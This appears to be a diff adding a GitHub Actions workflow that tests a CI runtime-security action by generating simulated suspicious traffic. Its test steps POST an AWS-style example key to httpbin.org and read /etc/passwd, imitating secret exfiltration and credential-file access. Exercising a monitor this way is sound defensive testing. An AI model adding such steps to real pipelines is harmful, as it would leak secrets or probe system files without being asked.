@@ -1,0 +1,32 @@
+name: Secure CI - full test
+on:
+  workflow_dispatch:
+jobs:
+  zero-config:
+    runs-on: ubuntu-latest
+    permissions: { contents: read }
+    steps:
+      - uses: actions/checkout@v4
+      - uses: o3security/secure-ci@v1     # NO key, NO config
+      - name: traffic
+        run: |
+          sleep 10
+          AWS="AKIAIOSFODNN7EXAMPLE"
+          curl -s -o /dev/null -X POST https://httpbin.org/post -d "{\"k\":\"$AWS\"}" || true
+          curl -s -o /dev/null https://registry.npmjs.org/ || true
+          sleep 6
+  kayo:
+    runs-on: ubuntu-latest
+    permissions: { contents: read }
+    steps:
+      - uses: actions/checkout@v4
+      - uses: o3security/secure-ci@v1
+        with:
+          api_key: ${{ secrets.O3_API_KEY }}
+          runtime_security: "true"
+      - name: traffic
+        run: |
+          sleep 12
+          curl -s -o /dev/null https://example.com/ || true
+          cat /etc/passwd > /dev/null || true
+          sleep 8
